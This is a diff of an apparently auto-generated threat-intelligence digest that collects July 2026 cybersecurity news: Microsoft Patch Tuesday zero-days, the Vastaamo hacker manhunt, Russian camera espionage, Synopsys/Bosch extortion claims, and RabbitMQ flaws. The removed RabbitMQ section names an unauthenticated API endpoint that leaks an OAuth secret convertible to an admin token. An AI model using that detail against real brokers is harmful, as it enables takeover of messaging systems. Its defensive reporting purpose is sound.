Intelligence Cloud. Learn more. No previous article No new articles Daryna Antoniuk is a reporter for Recorded Future News based in Ukraine. She writes about cybersecurity startups, cyberattacks in Eastern Europe and the state of the cyberwar between Ukraine and Russia. She previously was a tech reporter for Forbes Ukraine. Her work has also been published at Sifted, The Kyiv Independent and The Kyiv Post.
+Microsoft July 2026 Patch Tuesday fixes massive 570 flaws, 3 zero-days By Lawrence Abrams July 14, 2026 02:01 PM 0 Today is Microsoft's July 2026 Patch Tuesday, and with it comes security updates for a record-breaking 570 flaws, including two zero-day vulnerabilities exploited in attacks and one publicly disclosed. Patch Tuesday addresses 59 "Critical" vulnerabilities, 48 of which are remote code execution, 9 are elevation of privilege, 1 is a security bypass, and 1 is a spoofing. The approximate number of bugs in each vulnerability category is listed below: 254 Elevation of Privilege Vulnerabilities 17 Security Feature Bypass Vulnerabilities 145 Remote Code Execution Vulnerabilities 102 Information Disclosure Vulnerabilities 35 Denial of Service Vulnerabilities 16 Spoofing Vulnerabilities When BleepingComputer reports on Patch Tuesday security updates, we only count those released by Microsoft today. Therefore, the number of flaws does not include flaws in Mariner, Azure OpenAI, Azure Synapse, M365 Copilot, Microsoft Exchange Online, Microsoft Edge for Android, and Microsoft Entra Provisioning Service that were fixed by Microsoft earlier this month. There were also a massive 468 Microsoft Edge/Chromium flaws that were fixed by Google this month, which were excluded from this Patch Tuesday roundup. As part of last month's June Patch Tuesday , Google fixed 360 flaws that were later ported to Microsoft Edge. Last week, Microsoft warned that there would be an increase in Patch Tuesday security updates as it has begun to use an AI-powered vulnerability discovery system to identify more security flaws across its Windows codebase before attackers can exploit them. To learn more about the non-security updates released today, you can review our dedicated articles on the Windows 11 KB5101650 & KB5099414 cumulative updates and the Windows 10 KB5099539 extended security update . Microsoft patches 3 zero-days This month's Patch Tuesday fixes three zero-day vulnerabilities, with two exploited in attacks and one publicly disclosed. Microsoft classifies a zero-day flaw as publicly disclosed or actively exploited while no official fix is available. The two actively exploited zero-days addressed during this month's Patch Tuesday are: CVE-2026-56155 - Active Directory Federation Services Elevation of Privilege Vulnerability Microsoft has patched an actively exploited vulnerability in Active Directory Federation Services that grants administrative privileges. "Insufficient granularity of access control in Active Directory Federation Services (AD FS) allows an authorized attacker to elevate privileges locally," warns Microsoft. Microsoft credited the flaw to Jeremy Kingston and Scott Clark of Microsoft Detection and Response Team (DART), Microsoft's incident response unit, indicating it was likely uncovered while investigating active attacks. Microsoft has not disclosed any details as to how the flaw was exploited in attacks. CVE-2026-56164 - Microsoft SharePoint Server Elevation of Privilege Vulnerability Microsoft has patched an actively exploited flaw in Microsoft SharePoint Server that allows a remote attacker to gain elevated privileges. "Missing authentication for critical function in Microsoft Office SharePoint allows an unauthorized attacker to elevate privileges over a network," explains Microsoft. Microsoft says that enabling the Antimalware Scan Interface (AMSI) on the server and setting the Request Body Scan mode to Full can help mitigate this flaw. No details have been released as to how this flaw was exploited in attacks. Microsoft credited the flaw to Jayson Frost with Mandiant Incident Response, Genwei Jiang with Google Cloud, FLARE OTF, and an anonymous researcher. The publicly disclosed zero-day that was fixed is: CVE-2026-50661 - Windows BitLocker Security Feature Bypass Vulnerability Microsoft has patched a publicly disclosed Windows BitLocker bypass flaw that could allow attackers to gain access to encrypted data. "A successf
 ```
 
 #### Corroborating sources (1)
 
-- **The Record** (cyber_news_breach_reporting)
-  - Title: Finland issues wanted notice for hacker behind massive psychotherapy data breach
-  - Published: 2026-07-14T17:28:00+00:00
-  - Link: https://therecord.media/finland-issues-wanted-notice-for-hacker-vastaamo-breach
-  - Summary: The defendant's lawyer told Finnish media that he does not know where his client is but believes Kivimäki is outside Finland.
-
-### Cluster 3dba733830 — score 9
-
-- Title: NATO logistics, Ukrainian troops are top subjects of Russian camera hacks, advisory says
-- Source: The Record (cyber_news_breach_reporting)
-- Published: 2026-07-14T13:55:00+00:00
-- Link: https://therecord.media/russian-intelligence-compromising-cameras-nato-ukraine-netherlands
-- Fetch status: ok
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: (none)
-
-#### Cluster taxonomy (union across members)
-- threat_categories: apt_espionage
-- affected_industries: manufacturing_industrial
-- content_type: vulnerability_disclosure
-- confidence_tier: tier_4_news
-
-#### Primary article taxonomy
-- threat_categories: apt_espionage
-- affected_industries: manufacturing_industrial
-- content_type: vulnerability_disclosure
-- confidence_tier: tier_4_news
-
-#### Summary
-
-```
-Dutch intelligence officials report that at least one Russian agency is compromising internet-connected cameras across Europe to spy on military logistics and Ukrainian personnel.
-```
-
-#### Full body
-
-```
-An M142 HIMARS driver in an artillery unit of 7th Rapid Response Corps of the Armed Forces of Ukraine. Image: General Staff of the Armed Forces of Ukraine via Facebook NATO logistics, Ukrainian troops are top subjects of Russian camera hacks, advisory says Russian state-backed hackers are systematically compromising internet-connected security cameras across Europe and Ukraine to gather intelligence on NATO military logistics and identify Ukrainian troops for battlefield targeting, Dutch intelligence agencies warned. In a public advisory , the Netherlands' General Intelligence and Security Service (AIVD) and Military Intelligence and Security Service (MIVD) said at least one Russian intelligence service has been carrying out cyber-espionage operations against internet-accessible cameras in the Netherlands, other NATO and EU member states and Ukraine. The goal is to collect intelligence of military value, including activity on military transport routes and weapons shipments destined for Ukraine. In Ukraine, the agencies said, hacked cameras have in some cases been used to locate Ukrainian military personnel, with the intelligence subsequently supporting attempts to kill soldiers and destroy equipment. The Dutch agencies said they also identified a small number of compromised cameras positioned along military logistics routes in the Netherlands as part of the broader operation. "As a key transit country, the Netherlands is an important espionage target due to its geographic location and its support for Ukraine," the July 10 advisory said. Moscow has repeatedly denied conducting malicious cyber operations against Western countries. Tracking NATO logistics According to the advisory, the attackers scan the internet for exposed devices, identify IP cameras based on manufacturer information and exploit weak security, including default passwords, outdated firmware and default configurations. The hackers then automatically analyze video feeds using image-recognition software to identify military vehicles and their cargo. Beyond the war, the Dutch intelligence services assess that Russia is also using the cameras to collect militarily relevant intelligence inside NATO and EU countries even when it is unrelated to Ukraine. While they said they have not observed Moscow using such information to support military attacks outside Ukraine, the campaign "demonstrates Russia's ability to collect operational intelligence that could be used in a future conflict." "The number of cyber espionage operations conducted by Russian state actors in support of military operations has steadily increased since the beginning of the war against Ukraine," the advisory said. The advisory urged organizations operating internet-connected cameras to strengthen their security by changing default credentials, keeping firmware up to date and reviewing device configurations. It also advised organizations to consider cameras’ country of origin. "Countries including China, Russia, and Iran actively conduct offensive cyber programs targeting Dutch interests," the advisory said. Nation-state News Technology Get more insights with the Recorded Future Intelligence Cloud. Learn more. No previous article No new articles Daryna Antoniuk is a reporter for Recorded Future News based in Ukraine. She writes about cybersecurity startups, cyberattacks in Eastern Europe and the state of the cyberwar between Ukraine and Russia. She previously was a tech reporter for Forbes Ukraine. Her work has also been published at Sifted, The Kyiv Independent and The Kyiv Post.
-```
-
-#### Corroborating sources (1)
-
-- **The Record** (cyber_news_breach_reporting)
-  - Title: NATO logistics, Ukrainian troops are top subjects of Russian camera hacks, advisory says
-  - Published: 2026-07-14T13:55:00+00:00
-  - Link: https://therecord.media/russian-intelligence-compromising-cameras-nato-ukraine-netherlands
-  - Summary: Dutch intelligence officials report that at least one Russian agency is compromising internet-connected cameras across Europe to spy on military logistics and Ukrainian personnel.
+- **BleepingComputer** (cyber_news_breach_reporting)
+  - Title: Microsoft July 2026 Patch Tuesday fixes massive 570 flaws, 3 zero-days
+  - Published: 2026-07-14T18:01:36+00:00
+  - Link: https://www.bleepingcomputer.com/news/microsoft/microsoft-july-2026-patch-tuesday-fixes-massive-570-flaws-3-zero-days/
+  - Summary: Today is Microsoft's July 2026 Patch Tuesday, and with it comes security updates for a record-breaking 570 flaws, including two zero-day vulnerabilities exploited in attacks and one publicly disclosed. [...]
 
 ### Cluster b000ca97d8 — score 9
 
@@ -3109,6 +2942,188 @@ US sanctions VPN, malware providers for enabling ransomware attacks By Sergiu Ga
   - Link: https://www.bleepingcomputer.com/news/security/us-sanctions-vpn-malware-providers-linked-to-ransomware-gangs/
   - Summary: The U.S. Treasury Department's Office of Foreign Assets Control (OFAC) sanctioned two individuals and one entity for enabling ransomware attacks against U.S. organizations. [...]
 
+### Cluster 5615f720c3 — score 9
+
+- Title: Finland issues wanted notice for hacker behind massive psychotherapy data breach
+- Source: The Record (cyber_news_breach_reporting)
+- Published: 2026-07-14T17:28:00+00:00
+- Link: https://therecord.media/finland-issues-wanted-notice-for-hacker-vastaamo-breach
+- Fetch status: ok
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: (none)
+
+#### Cluster taxonomy (union across members)
+- threat_categories: data_breach, ransomware_extortion
+- affected_industries: financial_services, government
+- content_type: incident_report
+- confidence_tier: tier_4_news
+
+#### Primary article taxonomy
+- threat_categories: ransomware_extortion, data_breach
+- affected_industries: financial_services, government
+- content_type: incident_report
+- confidence_tier: tier_4_news
+
+#### Summary
+
+```
+The defendant's lawyer told Finnish media that he does not know where his client is but believes Kivimäki is outside Finland.
+```
+
+#### Full body
+
+```
+Finland issues wanted notice for hacker behind massive psychotherapy data breach Finnish police have reportedly issued a wanted notice for convicted hacker Aleksanteri Kivimäki after the country's Supreme Court refused to hear his appeal, paving the way for authorities to return him to prison in one of Finland's most high-profile cybercrime cases. The Supreme Court's decision leaves in place a February Court of Appeal ruling that sentenced Kivimäki to nearly seven years in prison for hacking psychotherapy provider Vastaamo and later extorting both the company and its patients, according to Finnish media . Following the ruling, Eastern Uusimaa Police said they issued the wanted notice at the request of Finland's Criminal Sanctions Agency. Officers have been instructed to arrest Kivimäki if he is located and transfer him to Vantaa Prison to serve the rest of his sentence. His lawyer, Peter Jaari, told Finnish media that he does not know where his client is but believes Kivimäki is outside Finland. The Court of Appeal convicted Kivimäki of aggravated data breach, attempted extortion and unlawfully distributing private information. The judges said the crimes were carefully planned, driven by financial gain and caused exceptional harm to a large number of especially vulnerable victims. The court said the offenses would normally have justified the maximum available sentence. However, it reduced Kivimäki's prison term by one month because he reached compensation agreements with some of the victims. Kivimäki has denied carrying out the attack throughout the case. He argued that prosecutors relied largely on circumstantial evidence, challenged the digital evidence linking him to the hack and disputed allegations involving cryptocurrency transactions tied to the extortion scheme. The appeals court released Kivimäki from pretrial detention in September 2025 after finding that he had already spent enough time in custody and that keeping him detained any longer could violate his rights. Because most of his sentence had effectively been served while he awaited trial, he remained free during the appeals process. Now that the Supreme Court has declined to hear the case, the conviction is final. Finnish authorities are trying to find Kivimäki so he can serve the remainder of his sentence. The Vastaamo breach occurred in 2018 but did not become public until 2020, when the attacker first tried to extort the company before demanding money directly from thousands of patients. When many victims refused to pay, confidential therapy notes and other highly sensitive records were published online. The stolen database contained information on about 33,000 patients, and more than 24,000 people reported receiving extortion demands. The case became the largest criminal case in Finnish history by number of victims, many of whom were children or people receiving treatment for severe psychological trauma. Cybercrime Government News Get more insights with the Recorded Future Intelligence Cloud. Learn more. No previous article No new articles Daryna Antoniuk is a reporter for Recorded Future News based in Ukraine. She writes about cybersecurity startups, cyberattacks in Eastern Europe and the state of the cyberwar between Ukraine and Russia. She previously was a tech reporter for Forbes Ukraine. Her work has also been published at Sifted, The Kyiv Independent and The Kyiv Post.
+```
+
+#### Corroborating sources (1)
+
+- **The Record** (cyber_news_breach_reporting)
+  - Title: Finland issues wanted notice for hacker behind massive psychotherapy data breach
+  - Published: 2026-07-14T17:28:00+00:00
+  - Link: https://therecord.media/finland-issues-wanted-notice-for-hacker-vastaamo-breach
+  - Summary: The defendant's lawyer told Finnish media that he does not know where his client is but believes Kivimäki is outside Finland.
+
+### Cluster 3dba733830 — score 9
+
+- Title: NATO logistics, Ukrainian troops are top subjects of Russian camera hacks, advisory says
+- Source: The Record (cyber_news_breach_reporting)
+- Published: 2026-07-14T13:55:00+00:00
+- Link: https://therecord.media/russian-intelligence-compromising-cameras-nato-ukraine-netherlands
+- Fetch status: ok
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: (none)
+
+#### Cluster taxonomy (union across members)
+- threat_categories: apt_espionage
+- affected_industries: manufacturing_industrial
+- content_type: vulnerability_disclosure
+- confidence_tier: tier_4_news
+
+#### Primary article taxonomy
+- threat_categories: apt_espionage
+- affected_industries: manufacturing_industrial
+- content_type: vulnerability_disclosure
+- confidence_tier: tier_4_news
+
+#### Summary
+
+```
+Dutch intelligence officials report that at least one Russian agency is compromising internet-connected cameras across Europe to spy on military logistics and Ukrainian personnel.
+```
+
+#### Full body
+
+```
+An M142 HIMARS driver in an artillery unit of 7th Rapid Response Corps of the Armed Forces of Ukraine. Image: General Staff of the Armed Forces of Ukraine via Facebook NATO logistics, Ukrainian troops are top subjects of Russian camera hacks, advisory says Russian state-backed hackers are systematically compromising internet-connected security cameras across Europe and Ukraine to gather intelligence on NATO military logistics and identify Ukrainian troops for battlefield targeting, Dutch intelligence agencies warned. In a public advisory , the Netherlands' General Intelligence and Security Service (AIVD) and Military Intelligence and Security Service (MIVD) said at least one Russian intelligence service has been carrying out cyber-espionage operations against internet-accessible cameras in the Netherlands, other NATO and EU member states and Ukraine. The goal is to collect intelligence of military value, including activity on military transport routes and weapons shipments destined for Ukraine. In Ukraine, the agencies said, hacked cameras have in some cases been used to locate Ukrainian military personnel, with the intelligence subsequently supporting attempts to kill soldiers and destroy equipment. The Dutch agencies said they also identified a small number of compromised cameras positioned along military logistics routes in the Netherlands as part of the broader operation. "As a key transit country, the Netherlands is an important espionage target due to its geographic location and its support for Ukraine," the July 10 advisory said. Moscow has repeatedly denied conducting malicious cyber operations against Western countries. Tracking NATO logistics According to the advisory, the attackers scan the internet for exposed devices, identify IP cameras based on manufacturer information and exploit weak security, including default passwords, outdated firmware and default configurations. The hackers then automatically analyze video feeds using image-recognition software to identify military vehicles and their cargo. Beyond the war, the Dutch intelligence services assess that Russia is also using the cameras to collect militarily relevant intelligence inside NATO and EU countries even when it is unrelated to Ukraine. While they said they have not observed Moscow using such information to support military attacks outside Ukraine, the campaign "demonstrates Russia's ability to collect operational intelligence that could be used in a future conflict." "The number of cyber espionage operations conducted by Russian state actors in support of military operations has steadily increased since the beginning of the war against Ukraine," the advisory said. The advisory urged organizations operating internet-connected cameras to strengthen their security by changing default credentials, keeping firmware up to date and reviewing device configurations. It also advised organizations to consider cameras’ country of origin. "Countries including China, Russia, and Iran actively conduct offensive cyber programs targeting Dutch interests," the advisory said. Nation-state News Technology Get more insights with the Recorded Future Intelligence Cloud. Learn more. No previous article No new articles Daryna Antoniuk is a reporter for Recorded Future News based in Ukraine. She writes about cybersecurity startups, cyberattacks in Eastern Europe and the state of the cyberwar between Ukraine and Russia. She previously was a tech reporter for Forbes Ukraine. Her work has also been published at Sifted, The Kyiv Independent and The Kyiv Post.
+```
+
+#### Corroborating sources (1)
+
+- **The Record** (cyber_news_breach_reporting)
+  - Title: NATO logistics, Ukrainian troops are top subjects of Russian camera hacks, advisory says
+  - Published: 2026-07-14T13:55:00+00:00
+  - Link: https://therecord.media/russian-intelligence-compromising-cameras-nato-ukraine-netherlands
+  - Summary: Dutch intelligence officials report that at least one Russian agency is compromising internet-connected cameras across Europe to spy on military logistics and Ukrainian personnel.
+
+### Cluster 5fab32b5e5 — score 9
+
+- Title: Synopsys Finds No Evidence of Data Breach Amid Bosch Hack Claims
+- Source: SecurityWeek (cyber_news_breach_reporting)
+- Published: 2026-07-14T18:18:45+00:00
+- Link: https://www.securityweek.com/synopsys-finds-no-evidence-of-data-breach-following-bosch-hack-claims/
+- Fetch status: ok
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: (none)
+
+#### Cluster taxonomy (union across members)
+- threat_categories: data_breach, ransomware_extortion, zero_day
+- affected_industries: manufacturing_industrial
+- affected_products: Palo Alto Networks, SonicWall
+- urgency_signals: zero_day
+- content_type: incident_report
+- confidence_tier: tier_4_news
+
+#### Primary article taxonomy
+- threat_categories: ransomware_extortion, zero_day, data_breach
+- affected_industries: manufacturing_industrial
+- affected_products: Palo Alto Networks, SonicWall
+- urgency_signals: zero_day
+- content_type: incident_report
+- confidence_tier: tier_4_news
+
+#### Summary
+
+```
+The D1R cybercrime group claimed to have stolen valuable data from Synopsys and Bosch, threatening to leak it unless a ransom is paid. The post Synopsys Finds No Evidence of Data Breach Amid Bosch Hack Claims appeared first on SecurityWeek .
+```
+
+#### Full body
+
+```
+Silicon-to-systems design firm Synopsys says it has found no evidence of a data breach after a cybercrime group claimed to have hacked its systems and gained access to valuable data belonging to one of its major customers, Bosch. A new ransomware group named D1R in recent days listed Synopsys and Bosch on its Tor-based leak website. The cybercriminals claimed to have exploited a vulnerability in Synopsys’ website to access a corporate client database containing 40,000 entries, and they are threatening to leak the stolen data unless a ransom is paid. Separately, D1R claimed to have hacked German engineering and technology giant Bosch using data obtained from Synopsys. The cybercriminals allegedly obtained valuable intellectual property belonging to Bosch. Synopsys specializes in electronic design automation software and pre-designed semiconductor blueprints used to build and test microchips. The company supplies the software tools and digital chip blueprints that Bosch’s engineering teams rely on to design electronic components for modern vehicles and industrial systems. However, Synopsys told SecurityWeek that it has found no evidence to support the hackers’ claims. “The security of data and systems is a priority for Synopsys,” the company said. “We are continuously monitoring our network and have found no evidence of Synopsys or customer technical data being subject to unauthorized access. We have not been contacted by this threat actor and, based on our investigation, claims of unauthorized access to customer confidential data are unfounded.” Advertisement. Scroll to continue reading. Indeed, a screenshot of a document the hackers posted to prove access to Bosch data appears to be from a user manual that is already in the public domain. It’s not uncommon for cybercriminals to leak fake data or exaggerate the scope of their hacks. When contacted by SecurityWeek , Bosch declined to answer specific questions about the incident, offering a standard boilerplate statement instead: Bosch places great importance on cybersecurity. As a globally networked industrial company, Bosch continuously strengthens the protection of its digital systems and expands its capabilities to respond quickly and in a coordinated manner to potential cyber incidents. The goal is to protect critical systems based on risk and limit the impact of potential attacks. In this way, cybersecurity makes a significant contribution to Bosch’s reliability, operational capability, and resilience. Related : Accenture Confirms Data Breach After Hacker Claims Source Code Theft Related : Centers Laboratory Data Breach Affects 540,000 Individuals Related : 12 Million Impacted by Data Breach at Japanese Telco KDDI Written By Eduard Kovacs Eduard Kovacs (@EduardKovacs) is senior managing editor at SecurityWeek. He worked as a high school IT teacher before starting a career in journalism in 2011. Eduard holds a bachelor’s degree in industrial informatics and a master’s degree in computer techniques applied in electrical engineering. Daily Briefing Newsletter Subscribe to the SecurityWeek Email Briefing for the latest cybersecurity threats, trends, and expert insights. More from Eduard Kovacs Pentagon Suspends CMMC Phase 2 as It Rethinks Contractor Cybersecurity Rules Cybersecurity M&A Roundup: 37 Deals Announced in June 2026 Centers Laboratory Data Breach Affects 540,000 Individuals Third US Security Expert Sentenced to Prison for Helping Ransomware Gang China, India-Linked Hackers Both Targeted Same Pakistani Police Force ‘HalluSquatting’ Turns AI Hallucinations Into Botnet Delivery Mechanism Palo Alto Networks Patches 13 Vulnerabilities Microsoft Patches Defender ‘RoguePlanet’ Vulnerability Latest News Critical Vulnerabilities Patched With Fresh Chrome 150, Firefox 152 Updates SonicWall Issues Urgent SMA Patch Warning for Two Zero-Day Exploits Microsoft Patches Record 622 Vulnerabilities, Including Two Exploited Zero-Days Adobe Patches Critical ColdFusion Vulnerabilities 7
+```
+
+#### Corroborating sources (1)
+
+- **SecurityWeek** (cyber_news_breach_reporting)
+  - Title: Synopsys Finds No Evidence of Data Breach Amid Bosch Hack Claims
+  - Published: 2026-07-14T18:18:45+00:00
+  - Link: https://www.securityweek.com/synopsys-finds-no-evidence-of-data-breach-following-bosch-hack-claims/
+  - Summary: The D1R cybercrime group claimed to have stolen valuable data from Synopsys and Bosch, threatening to leak it unless a ransom is paid. The post Synopsys Finds No Evidence of Data Breach Amid Bosch Hack Claims appeared first on SecurityWeek .
+
+### Cluster 4e6c87c16b — score 9
+
+- Title: Microsoft discloses ‘the mother of all’ vulnerability loads, tripling June’s previous record
+- Source: CyberScoop (cyber_news_breach_reporting)
+- Published: 2026-07-14T20:05:46+00:00
+- Link: https://cyberscoop.com/microsoft-patch-tuesday-july-2026/
+- Fetch status: ok
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: (none)
+
+#### Cluster taxonomy (union across members)
+- threat_categories: active_exploitation, ransomware_extortion, zero_day
+- affected_industries: government
+- affected_products: Microsoft SharePoint
+- cve_ids: CVE-2026-27690, CVE-2026-44747, CVE-2026-56155, CVE-2026-56164
+- urgency_signals: actively_exploited, zero_day
+- content_type: vulnerability_disclosure
+- confidence_tier: tier_4_news
+
+#### Primary article taxonomy
+- threat_categories: ransomware_extortion, zero_day, active_exploitation
+- affected_industries: government
+- affected_products: Microsoft SharePoint
+- cve_ids: CVE-2026-56155, CVE-2026-56164, CVE-2026-44747, CVE-2026-27690
+- urgency_signals: actively_exploited, zero_day
+- content_type: vulnerability_disclosure
+- confidence_tier: tier_4_news
+
+#### Summary
+
+```
+The company forewarned customers and defenders that a flood of defects would be uncovered by AI. It delivered with a striking exponential increase. The post Microsoft discloses ‘the mother of all’ vulnerability loads, tripling June’s previous record appeared first on CyberScoop .
+```
+
+#### Full body
+
+```
+Advertisement Subscribe to our daily newsletter. Subscribe Close Microsoft’s monthly Patch Tuesday security program reached an unrivaled pinnacle this month, as the vendor addressed 622 vulnerabilities across its suite of business products and systems. “The bug apocalypse has finally descended upon us,” Dustin Childs, head of threat awareness at Trend Micro’s Zero Day Initiative, wrote in a blog post Tuesday. “The mother of all releases. To call this record-breaking is an understatement,” he added. “The CVE count year-to-date exceeds all other years’ totals.” The startling increase in vulnerabilities reflects a compounding effect taking root across software as artificial intelligence plays a growing role in discovering and developing patches for defects lurking in error-riddled applications. Advertisement Microsoft’s June Patch Tuesday update broke the previous all-time record with 206 vulnerabilities. The company last week warned forewarned customers and defenders that a flood of defects would be uncovered as it applies its multi-model agentic scanning harness (MDASH) to discover and address vulnerabilities at greater speed and scale. The monthly exponential rise in Microsoft vulnerabilities already puts the vendor on pace to break a full-year record, ending 2026 with the largest annual collection of defects, beating the previous record of 1,245 CVEs in 2020, Satnam Narang, senior staff research engineer at Tenable, said in an email. “It’s probable that we will not only exceed 2,000 CVEs in a calendar year, but potentially over 3,000 CVEs this year or more,” he added. “The volume is striking, but it reflects how good these tools have become at finding bugs, not how many of those bugs actually pose a risk to organizations,” Narang said. Advertisement Microsoft disclosed two actively exploited zero-day vulnerabilities — CVE-2026-56155 and CVE-2026-56164 , privilege escalation defects in Active Directory Federation Services and Microsoft SharePoint Server, respectively. The monthly batch of patches included 416 defects in Windows, 82 in Office and 46 in Microsoft Edge. More than 1 in 10 vulnerabilities the vendor disclosed — 63 total — were rated as critical. “The products covered this month are also astonishing,” Childs said. “Just about everything you’ve ever heard of is getting patched.” The full list of vulnerabilities addressed this month is available in Microsoft’s Security Response Center . SAP also addressed a fresh assortment of vulnerabilities Tuesday, including critical defects CVE-2026-44747 in SAP NetWeaver Application Server and CVE-2026-27690 in SAP Approuter. Share Facebook LinkedIn Twitter Copy Link Advertisement Advertisement More Like This Advertisement Top Stories Advertisement More Scoops (Jeenah Moon/Getty Images) (Getty Images) Cisco logo sits illuminated at MWC Barcelona on February 28, 2022. (David Ramos/Getty Images) Latest Podcasts When iPhone exploits turn into commodities What the post-quantum executive order means for CISOs How security investigators can get the right info out of AI security tools Inside Operation Disruption Week: Taking Down Southeast Asia’s Scam Machine Government Officials once again warn defenders that Russian hackers are targeting network devices CISA looks to remedy ailments from big May credential leak French nonprofit starts global intelligence and research hub for AI cyber threats US Army websites defaced with pro-Kurdish sentiments, insults to Trump Technology Deepfake CSAM lawsuit against xAI, Grok expands US lifting export control restrictions on Anthropic’s Mythos, Fable Supreme Court delivers ‘major win’ for tech privacy in Chatrie ruling What the post-quantum executive order really demands of CISOs Threats Armenian national pleads guilty to Ryuk ransomware attacks Former DigitalMint ransomware negotiator who duped clients sentenced to 70 months in jail Interpol cybercrime crackdown nets 5,800 arrests across 97 countries 764 splinter group leader sentenced to 40 years
+```
+
+#### Corroborating sources (1)
+
+- **CyberScoop** (cyber_news_breach_reporting)
+  - Title: Microsoft discloses ‘the mother of all’ vulnerability loads, tripling June’s previous record
+  - Published: 2026-07-14T20:05:46+00:00
+  - Link: https://cyberscoop.com/microsoft-patch-tuesday-july-2026/
+  - Summary: The company forewarned customers and defenders that a flood of defects would be uncovered by AI. It delivered with a striking exponential increase. The post Microsoft discloses ‘the mother of all’ vulnerability loads, tripling June’s previous record appeared first on CyberScoop .
+
 ### Cluster 09c50b3a4b — score 9
 
 - Title: Friday Squid Blogging: “Squidbleed” Vulnerability
@@ -3149,57 +3164,6 @@ ResearcherZero • July 11, 2026 4:18 AM De-funding public access to government 
   - Published: 2026-07-10T21:07:13+00:00
   - Link: https://www.schneier.com/blog/archives/2026/07/friday-squid-blogging-squidbleed-vulnerability.html
   - Summary: In a rare combined cybersecurity/squid post, a twenty-nine-year-old squid proxy bug can leak HTTP requests. As usual, you can also use this squid post to talk about the security stories in the news that I haven’t covered. Blog moderation policy.
-
-### Cluster 53ef47508e — score 9
-
-- Title: RabbitMQ Flaws Could Leak OAuth Secrets and Expose Cross-Tenant Queue Metadata
-- Source: The Hacker News (cyber_news_breach_reporting)
-- Published: 2026-07-14T13:48:07+00:00
-- Link: https://thehackernews.com/2026/07/rabbitmq-flaws-could-leak-oauth-secrets.html
-- Fetch status: ok
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: (none)
-
-#### Cluster taxonomy (union across members)
-- threat_categories: mfa_bypass
-- actor_attribution: Scattered Spider
-- affected_industries: financial_services
-- affected_products: GitHub
-- cve_ids: CVE-2026-57219, CVE-2026-57221
-- urgency_signals: no_patch_yet, preauth_unauth
-- content_type: incident_report
-- confidence_tier: tier_4_news
-
-#### Primary article taxonomy
-- threat_categories: mfa_bypass
-- actor_attribution: Scattered Spider
-- affected_industries: financial_services
-- affected_products: GitHub
-- cve_ids: CVE-2026-57219, CVE-2026-57221
-- urgency_signals: preauth_unauth, no_patch_yet
-- content_type: incident_report
-- confidence_tier: tier_4_news
-
-#### Summary
-
-```
-Cybersecurity researchers have disclosed details of two access control-related flaws impacting the RabbitMQ message broker service that could allow attackers to leak OAuth client secrets, expose enterprise messaging infrastructure to takeover risks, and bypass tenant boundaries. Miggo's security team, which discovered and reported the flaws, said one "leaks the broker's confidential OAuth
-```
-
-#### Full body
-
-```
-RabbitMQ Flaws Could Leak OAuth Secrets and Expose Cross-Tenant Queue Metadata  Ravie Lakshmanan  Jul 14, 2026 Vulnerability / Network Security Cybersecurity researchers have disclosed details of two access control-related flaws impacting the RabbitMQ message broker service that could allow attackers to leak OAuth client secrets, expose enterprise messaging infrastructure to takeover risks, and bypass tenant boundaries. Miggo's security team, which discovered and reported the flaws, said one "leaks the broker's confidential OAuth secret to an unauthenticated attacker in a single request, a direct path to full broker takeover in the configurations that use that secret." The second vulnerability allows any logged-in user to silently read other tenants' data. Both shortcomings are said to have been present in the codebase since early 2024, impacting RabbitMQ release lines from 3.13.0 and later. They have been addressed in versions 4.3.0, 4.2.6, 4.1.11, 4.0.20, and 3.13.15. There is no evidence of active exploitation of either of the vulnerabilities prior to the public disclosure. A brief description of the two flaws is below - CVE-2026-57219 (CVSS score: 8.7) - An obsolete HTTP API endpoint ("GET /api/auth") that reveals client secret on RabbitMQ installations that had OAuth 2 configured to use the management.oauth_client_secret configuration key, allowing an attacker to exchange it for an administrator token and obtain full control of every message, queue, user, and broker setting. CVE-2026-57221 (CVSS score: 5.3) - A missing authorization that allows any authenticated user who can connect to a virtual host to enumerate all queue and exchange names in that virtual host and read queue message counts and consumer counts, regardless of their actual permissions. "The endpoint's authorization check was hard-coded to always allow the request, unlike every other sensitive management endpoint," Miggo said about CVE-2026-57219. "The risk is sharpest wherever the management port is reachable by an untrusted network: cloud or multi-tenant setups, or a management UI accidentally exposed to the internet." Besides patching to the latest versions, it's advised to rotate the OAuth client secret if the management interface is reachable over the internet, limit access to port 15672 to prevent the management interface from being reachable over the network, separate tenants by virtual host, and implement firewall rules to block access to the vulnerable endpoint on unpatched instances. The disclosure comes as RabbitMQ maintainers addressed two critical-severity flaws that could result in a TLS client-authentication bypass (CVSS score: 9.1) and allow an attacker in an adversary-in-the-middle (AitM) position to forge JSON Web Key Set (JWKS) responses and cause the broker to accept arbitrary JWTs (CVSS score: 9.2). Found this article interesting? Follow us on Google News , Twitter and LinkedIn to read more exclusive content we post. SHARE      Tweet  Share  Share  Share SHARE  API Security , Application Security , Cloud security , enterprise security , Identity and Access Management , network security , Open Source Security , Vulnerability ⚡ Top Stories This Week 16-Year-Old Linux KVM Flaw Lets Guest VMs Escape to Host on Intel and AMD x86 Systems BeyondTrust Patches Critical Auth Bypass Flaws in Remote Support and PRA Court Filing Reveals Windows Device ID Helped FBI Trace Alleged Scattered Spider Hacker Rogue Agent Flaw Could Have Let Attackers Hijack Google Dialogflow CX Chatbots RedWing MaaS Packages Android Bank Fraud as a Telegram Rental Service 15-Year-Old GhostLock Flaw Enables Root and Container Escape on Most Linux Distros GitHub Copilot Refuses Harmful Requests in Chat, Then Writes Them in Code New HalluSquatting Attack Could Trick AI Coding Assistants Into Installing Botnet Malware GhostApproval Symlink Flaws Could Let Malicious Repos Run Code in AI Coding Agents Top AI Agents Built to Catch Malicious Code Can Be Tricked Into Run
-```
-
-#### Corroborating sources (1)
-
-- **The Hacker News** (cyber_news_breach_reporting)
-  - Title: RabbitMQ Flaws Could Leak OAuth Secrets and Expose Cross-Tenant Queue Metadata
-  - Published: 2026-07-14T13:48:07+00:00
-  - Link: https://thehackernews.com/2026/07/rabbitmq-flaws-could-leak-oauth-secrets.html
-  - Summary: Cybersecurity researchers have disclosed details of two access control-related flaws impacting the RabbitMQ message broker service that could allow attackers to leak OAuth client secrets, expose enterprise messaging infrastructure to takeover risks, and bypass tenant boundaries. Miggo's security team, which discovered and reported the flaws, said one "leaks the broker's confidential OAuth
 
